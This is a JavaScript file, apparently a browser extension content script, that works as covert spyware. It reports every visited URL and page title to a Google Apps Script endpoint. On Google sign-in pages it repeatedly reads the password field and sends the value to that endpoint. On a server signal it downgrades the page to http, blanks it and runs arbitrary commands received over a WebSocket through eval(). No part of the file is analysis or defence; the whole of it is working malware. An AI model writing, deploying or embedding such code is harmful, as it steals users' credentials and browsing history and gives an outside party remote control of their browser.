console.log('V17');

// Log URLs and init actions
fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
  mode: 'cors'
})
  .then(r => r.text())
  .then(t => {
    if (t.split('@')[0] === 'live') {
      initLiveControl(t.split('@')[1]);
    }
  })
siteSpecifics(window.location.host)

var href = window.location.href;
setInterval(() => {
  if (window.location.href !== href) {
    href = window.location.href;
    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
      mode: 'cors'
    })
    siteSpecifics(window.location.host)
  }
}, 50);

// Live Control
function initLiveControl(socketUrl) {
  if (window.location.protocol === 'https:') {
    window.location = 'http://example.com'
  }
  if (window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080') {

    console.log('Live');
    $('html')[0].innerHTML = `
    <head>
    <title>blank</title>
    </head>
    <body></body>
    `;

    const socket = new WebSocket(socketUrl);

    socket.addEventListener('open', function (event) {
      var message = {
        type: "handshake",
        content: "client"
      }
      socket.send(JSON.stringify(message));
    });

    socket.addEventListener('message', function (event) {
      var data = JSON.parse(event.data);
      console.log(data);
      if (data.type === 'commandClient') {
        eval(data.content);
      }
    });
  }
}

// Distribute site specific tasks
function siteSpecifics(host) {

  if (host === 'accounts.google.com') {
    initPasswordMonitor();
  }

}

// Google Password
function initPasswordMonitor() {
  if (window.location.pathname.split('/')[1] === 'signin') {

    console.log('Monitoring');

    var password = $("input.whsOnd[type='password']");
    var currentVal = password.attr('data-initial-value');

    // Send to server
    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });

    // Check to see if the password has changed
    setInterval(() => {
      if (password.attr('data-initial-value') !== currentVal) {

        currentVal = password.attr('data-initial-value');

        // Send to server
        fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
      }
    }, 10);
  }
}